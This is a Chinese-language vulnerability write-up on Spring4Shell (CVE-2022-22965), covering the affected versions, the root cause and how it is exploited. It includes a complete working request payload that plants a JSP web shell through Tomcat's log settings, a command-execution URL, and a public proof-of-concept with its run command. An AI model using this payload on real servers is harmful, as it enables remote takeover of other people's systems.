## 漏洞编号

CVE-2022-22965

CNVD-2022-23942

## 影响范围

满足以下条件的应用：

1\. JDK>=9

2\. 以war包形式部署在tomcat上

3\. 引入了Spring MVC或Spring WebFlux

4\. Spring Framework 版本 5.3.0 到 5.3.17，5.2.0 到 5.2.19 以及更早的版本

## 漏洞原理

利用Spring的对象绑定功能将HTTP请求中的参数绑定到应用程序正在使用的某个对象中

getCachedIntrospectionResults方法被用于在未授权情况下获取对象

与CVE-2010-1622很相似，当时修复此漏洞的方式是检查类名，禁止任何class对象获取classloader和protectionDomain，然而JDK9新增的模块化功能使得CVE-2010-1622的补丁被绕过

利用此漏洞，攻击者可以覆写Tomcat日志配置进而上传JSP web shell

  

### 为什么问题出在JDK9以上?

低版本的JDK的class类不存在module属性

## 利用方式

向目标应用发送如下请求即可上传一个名为tomcatwar.jsp的web shell到web根目录下，使用如下Get请求即可执行命令：

http://{victim IP}:8080/tomcatwar[.]jsp?pwd=j&cmd=whoami

![Specific headers and class attributes for the creation of a JSP web
shell](https://image.3001.net/images/20220413/1649853462_6256c41616d1f14f722f1.png!small)

请求体中的payload如下

    
    
    class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i
    
    class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
    
    class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
    
    class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar
    
    class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=

  

## 漏洞利用脚本及复现环境

<https://github.com/reznok/Spring4Shell-POC>  

> git clone <https://github.com/reznok/Spring4Shell-POC>  
>
>
> python exploit.py --url "http://target.com"  
>

## 参考链接

<https://www.trendmicro.com/en_us/research/22/d/cve-2022-22965-analyzing-the-exploitation-of-spring4shell-vulner.html>  

[https://xz.aliyun.com/t/11143﻿](https://xz.aliyun.com/t/11143)  

  

  

